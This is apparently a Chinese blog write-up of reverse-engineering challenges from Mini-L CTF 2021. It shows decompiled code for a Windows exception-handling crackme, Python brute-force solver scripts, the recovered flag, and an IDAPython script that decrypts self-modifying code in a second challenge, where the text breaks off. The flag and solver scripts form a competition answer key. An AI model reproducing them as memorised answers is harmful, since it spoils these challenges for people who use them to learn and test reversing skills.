<!DOCTYPE html>
<html lang="zh-CN">
    <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>WriteUps of Mini-L CTF 2021 - deebato&#39;s blog</title>
  
    <link rel="shortcut icon" href="/img/favicon.jpg">
  
  

  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="always"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">deebato&#39;s blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/tags">Tags</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item" href="/something">Something</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/D33BaT0" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/MiniL/">MiniL</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>May</span>
            <span>20,</span>
            <span>2021</span>
        </div>
        

        <h2 class="title">WriteUps of Mini-L CTF 2021</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>被树师傅和车钥匙带飞~</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse:"></a><strong>Reverse:</strong></h1><h2 id="0ooops-hs-done"><a href="#0ooops-hs-done" class="headerlink" title="0ooops | hs | done"></a>0ooops | hs | done</h2><p>其实说实话没怎么看懂这道题……最后做出来题也是爆破出来的</p>
<p>==0x00 初见==</p>
<p>首先拖进ida，简单美化一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">28</span>]; <span class="comment">// [esp+E0h] [ebp-F0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ipt[<span class="number">104</span>]; <span class="comment">// [esp+14Ch] [ebp-84h] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+1B8h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  j_memset(ipt, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">"Please input your flag: "</span>);</span><br><span class="line">  j_memset(&amp;v4[<span class="number">25</span>], <span class="number">0</span>, <span class="number">0x4B</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>, (<span class="type">char</span>)v4);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, (<span class="type">char</span>)ipt);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)check(ipt) )</span><br><span class="line">  {</span><br><span class="line">    MEMORY[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">-2</span>;</span><br><span class="line">  }</span><br><span class="line">  fail();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>此时ida反汇编已经出问题了……</p>
<p>所以直接看汇编，发现在<code>loc_82330</code>有<code>try-except</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:00082330 loc_82330:                              ; CODE XREF: _main_0+15C↑j</span><br><span class="line">.text:00082330 ;   __try { // __except at loc_82377</span><br><span class="line">.text:00082330                 mov     [ebp+ms_exc.registration.TryLevel], 0</span><br><span class="line">.text:00082337                 lea     ebx, [ebp+ipt]</span><br><span class="line">.text:0008233D                 xor     eax, eax</span><br><span class="line">.text:0008233F                 db      3Eh             ; Keypatch modified this from:</span><br><span class="line">.text:0008233F                 mov     dword ptr [eax], 0 ;   mov dword ptr [eax], 0</span><br><span class="line">.text:0008233F                                         ; Keypatch padded NOP to next boundary: 6 bytes</span><br><span class="line">.text:0008233F                                         ; Keypatch modified this from:</span><br><span class="line">.text:0008233F                                         ;   mov dword ptr [eax], 0</span><br><span class="line">.text:0008233F                                         ; Keypatch padded NOP to next boundary: 6 bytes</span><br><span class="line">.text:00082346                 mov     edx, 0</span><br><span class="line">.text:0008234B                 div     edx</span><br><span class="line">.text:0008234B ;   } // starts at 82330</span><br><span class="line">.text:0008234D                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh</span><br><span class="line">.text:00082354                 jmp     short loc_82381</span><br><span class="line">.text:00082356 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00082356</span><br><span class="line">.text:00082356 loc_82356:                              ; DATA XREF: .rdata:stru_8A238↓o</span><br><span class="line">.text:00082356 ;   __except filter // owned by 82330</span><br><span class="line">.text:00082356                 mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">.text:00082359                 mov     ecx, [eax]</span><br><span class="line">.text:0008235B                 mov     edx, [ecx]</span><br><span class="line">.text:0008235D                 mov     [ebp+a1], edx</span><br><span class="line">.text:00082363                 mov     eax, [ebp+ms_exc.exc_ptr]</span><br><span class="line">.text:00082366                 push    eax             ; a2</span><br><span class="line">.text:00082367                 mov     ecx, [ebp+a1]</span><br><span class="line">.text:0008236D                 push    ecx             ; a1</span><br><span class="line">.text:0008236E                 call    j_key_func_2</span><br><span class="line">.text:00082373                 add     esp, 8</span><br><span class="line">.text:00082376                 retn</span><br><span class="line">.text:00082377 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00082377</span><br><span class="line">.text:00082377 loc_82377:                              ; DATA XREF: .rdata:stru_8A238↓o</span><br><span class="line">.text:00082377 ;   __except(loc_82356) // owned by 82330</span><br><span class="line">.text:00082377                 mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">.text:0008237A                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh</span><br></pre></td></tr></table></figure>



<p>猜测应该是<code>try</code>部分代码出现问题，比如如下两句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0008233F                 mov     dword ptr [eax], 0 ;</span><br><span class="line">.text:00082346                 mov     edx, 0</span><br><span class="line">.text:0008234B                 div     ed</span><br></pre></td></tr></table></figure>

<p>一个是向一个不可访问的地址写入数据，一个是用0做分母，引发了报错，然后进入<code>except</code></p>
<p>==0x01 发现关键代码==</p>
<p>其实在发现<code>try-except</code>语句之前，我瞎j8翻了翻<code>text</code>段，找到了两个非常可疑的函数，非常像flag验证程序，如下	(函数声明与数据类型已经过修正)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">key_func1</span><span class="params">(<span class="type">int</span> **a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode();</span><br><span class="line">  <span class="keyword">if</span> ( **a1 != <span class="number">0xC0000005</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="type">char</span> *)(a1[<span class="number">1</span>][<span class="number">41</span>] + <span class="number">9</span>);</span><br><span class="line">  v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">3</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">4</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">  v3[<span class="number">6</span>] = <span class="number">4</span>;</span><br><span class="line">  v3[<span class="number">7</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v3[<span class="number">9</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">10</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">11</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">13</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">14</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">15</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">16</span>] = <span class="number">6</span>;</span><br><span class="line">  v3[<span class="number">17</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">18</span>] = <span class="number">17</span>;</span><br><span class="line">  v3[<span class="number">19</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">20</span>] = <span class="number">5</span>;</span><br><span class="line">  v3[<span class="number">21</span>] = <span class="number">62</span>;</span><br><span class="line">  v3[<span class="number">22</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">23</span>] = <span class="number">24</span>;</span><br><span class="line">  v3[<span class="number">24</span>] = <span class="number">21</span>;</span><br><span class="line">  v3[<span class="number">25</span>] = <span class="number">72</span>;</span><br><span class="line">  v3[<span class="number">26</span>] = <span class="number">46</span>;</span><br><span class="line">  v3[<span class="number">27</span>] = <span class="number">69</span>;</span><br><span class="line">  v3[<span class="number">28</span>] = <span class="number">33</span>;</span><br><span class="line">  v3[<span class="number">29</span>] = <span class="number">31</span>;</span><br><span class="line">  v3[<span class="number">30</span>] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">31</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != (((v4[<span class="number">2</span> * i] ^ <span class="number">0x37</span>) + <span class="number">4</span>) ^ <span class="number">0x42</span>) )</span><br><span class="line">    {</span><br><span class="line">      a1[<span class="number">1</span>][<span class="number">46</span>] += <span class="number">66</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  a1[<span class="number">1</span>][<span class="number">46</span>] += <span class="number">7</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">key_func2</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> **a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-40h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [esp+DCh] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [esp+104h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode();</span><br><span class="line">  <span class="keyword">if</span> ( **a2 != <span class="number">0xC0000094</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = (<span class="type">char</span> *)(a2[<span class="number">1</span>][<span class="number">41</span>] + <span class="number">9</span>);</span><br><span class="line">  qmemcpy(v4, <span class="string">"!V -}VG-bp}m-nG!b|ra GyGE|Drp D"</span>, <span class="number">31</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">31</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != ((<span class="type">unsigned</span> __int8)a2[<span class="number">1</span>][<span class="number">46</span>] ^ ((v5[<span class="number">2</span> * i + <span class="number">1</span>] ^ <span class="number">0x4D</span>) - <span class="number">4</span>) ^ <span class="number">0x13</span>) )</span><br><span class="line">    {</span><br><span class="line">      a2[<span class="number">1</span>][<span class="number">46</span>] += <span class="number">54</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  a2[<span class="number">1</span>][<span class="number">46</span>] += <span class="number">63</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>其实最开始看到这两端代码的时候还是挺异或的(后来发现main函数的<code>exception</code>可以调用<code>key_func2</code>,<code>key_func1</code>由一个<code>Handler</code>调用)……发现对指针<code>a1</code>和<code>a2</code>的使用有点像二维数组（进行了两次解引用），然后修改数据类型之后，代码变得正常了一些。</p>
<p><code>key_func1</code>比较正常，直接可以解出一个字符串，exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str1=[<span class="number">16</span>,<span class="number">4</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">21</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">31</span>,<span class="number">46</span>,<span class="number">33</span>,<span class="number">46</span>,<span class="number">72</span>,<span class="number">21</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">17</span>,<span class="number">69</span>,<span class="number">5</span>,<span class="number">62</span>,<span class="number">46</span>,<span class="number">24</span>,<span class="number">21</span>,<span class="number">72</span>,<span class="number">46</span>,<span class="number">69</span>,<span class="number">33</span>,<span class="number">31</span>,<span class="number">10</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    x = ((i ^ <span class="number">0x42</span>) - <span class="number">4</span>) ^ <span class="number">0x37</span> </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x),end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># yuarayudrtn_h_1dw_x4tO_ad1_4hns</span></span><br></pre></td></tr></table></figure>

<p>问题出在<code>key_func2</code>，该函数在验证的时候（line 14）使用了<code>a2[1][46]</code>，按照我的分析进度，这个数值是不可知的，最后决定爆破，看当<code>a2[1][46]</code>为何值时，可以使解出来的明文全都是可见字符，并且与第一段明文拼接之后可以得到有意义的字符串，下面是爆破脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">7H63cHY3tfcs3pY7tbdw6YY[bZdf6Z</span><br><span class="line">6I72bIX2ugbr2qX6ucev7X~XZc[eg7[</span><br><span class="line">5J41aJ[1vdaq1r[5v`fu4[}[Y`Xfd4X</span><br><span class="line">4K50`KZ0we`p0sZ4wagt5Z|ZXaYge5Y</span><br><span class="line">3\27g\m7pbgw7tm3pf`s2mkmofn`b2n</span><br><span class="line">2]36f]l6qcfv6ul2qgar3ljlngoac3o</span><br><span class="line">1^05e^o5r`eu5vo1rdbq0oiomdlb`0l</span><br><span class="line">0_14d_n4sadt4wn0secp1nhnlemca1m</span><br><span class="line">#l"'wl]'`rwg'd]#`vpc"]{]_v^pr"^</span><br><span class="line">"m#&amp;vm\&amp;asvf&amp;e\"awqb#\z\^w_qs#_</span><br><span class="line">!n %un_%bpue%f_!btra _y_]t\rp \</span><br><span class="line"> o!$to^$cqtd$g^ cus`!^x^\u]sq!]</span><br></pre></td></tr></table></figure>

<p>下面是拼接两端明文的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">"yuarayudrtn_h_1dw_x4tO_ad1_4hns"</span></span><br><span class="line">str2=<span class="string">"7H63cHY3tfcs3pY7tbdw6YY[bZdf6Z "</span></span><br><span class="line">str3=<span class="string">"6I72bIX2ugbr2qX6ucev7X~XZc[eg7["</span></span><br><span class="line">str4=<span class="string">"5J41aJ[1vdaq1r[5v`fu4[}[Y`Xfd4X"</span></span><br><span class="line">str5=<span class="string">"4K50`KZ0we`p0sZ4wagt5Z|ZXaYge5Y"</span></span><br><span class="line">str6=<span class="string">"3\\27g\m7pbgw7tm3pf`s2mkmofn`b2n"</span></span><br><span class="line">str7=<span class="string">"2]36f]l6qcfv6ul2qgar3ljlngoac3o"</span></span><br><span class="line">str8=<span class="string">"1^05e^o5r`eu5vo1rdbq0oiomdlb`0l"</span></span><br><span class="line">str9=<span class="string">"0_14d_n4sadt4wn0secp1nhnlemca1m"</span></span><br><span class="line">flag=<span class="string">"miniLctf{"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    flag+=str1[i]</span><br><span class="line">    flag+=str9[i]</span><br><span class="line">flag+=<span class="string">"}"</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>发现使用<code>str9</code>，即<code>a2[1][46]</code>为75时，可以得到flag</p>
<p><code>miniLctf{y0u_a1r4ady_und4rstand_th4_w1nd0ws_exc4pt1On_handl1e_m4chan1sm}</code></p>
<p>尝试提交之后发现flag正确，但是没有弄懂为什么<code>a2[1][46]</code>是75</p>
<h2 id="sub-hs-done"><a href="#sub-hs-done" class="headerlink" title="sub | hs | done"></a>sub | hs | done</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> __CheckForDebuggerJustMyCode(&amp;unk_408015);</span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x200</span>u);</span><br><span class="line">  Stream = fopen(Filename, <span class="string">"rb"</span>);</span><br><span class="line">  fseek(Stream, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  Size = ftell(Stream);</span><br><span class="line">  Buffer = <span class="built_in">malloc</span>(Size);</span><br><span class="line">  fseek(Stream, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  fread(Buffer, <span class="number">1u</span>, Size, Stream);</span><br><span class="line">  v22 = Buffer;</span><br><span class="line">  v21 = (<span class="type">int</span>)Buffer + *((_DWORD *)Buffer + <span class="number">15</span>);</span><br><span class="line">  v20 = v21 + <span class="number">4</span>;</span><br><span class="line">  v19 = v21 + <span class="number">24</span>;</span><br><span class="line">  v18 = v21 + <span class="number">24</span> + *(<span class="type">unsigned</span> __int16 *)(v21 + <span class="number">20</span>);</span><br><span class="line">  ElementCount = *(_DWORD *)(v18 + <span class="number">40</span> * (*(<span class="type">unsigned</span> __int16 *)(v21 + <span class="number">6</span>) - <span class="number">1</span>) + <span class="number">16</span>);</span><br><span class="line">  Offset = *(_DWORD *)(v18 + <span class="number">40</span> * (*(<span class="type">unsigned</span> __int16 *)(v21 + <span class="number">6</span>) - <span class="number">1</span>) + <span class="number">20</span>);</span><br><span class="line">  Block = <span class="built_in">malloc</span>(ElementCount);</span><br><span class="line">  fseek(Stream, Offset, <span class="number">0</span>);</span><br><span class="line">  fread(Block, <span class="number">1u</span>, ElementCount, Stream);</span><br><span class="line">  sub_401000(Block, ElementCount);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401000</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+D0h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_408015);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) ^= <span class="number">0x64</span>u;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>首先有一个自修改代码，用idapython脚本解一下smc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8b00</span>):</span><br><span class="line">    patch_byte(<span class="number">0x40A000</span>+i, get_byte(<span class="number">0x40A000</span>+i)^<span class="number">0x64</span>)</span><br></pre></td></tr></table></figure>

<p>然后搜索字符串发现可以找到<code>Please input your flag: </code>等字符串，但是无法找到交叉引用，这时看0x40A000地址处的数据，发现有点像一个PE文件的文件头（看了好久才发现），然后把smc部分的十六进制数据提取出来，另存为一个新的hex文件，再次用ida反编译，可以看到真正代码</p>
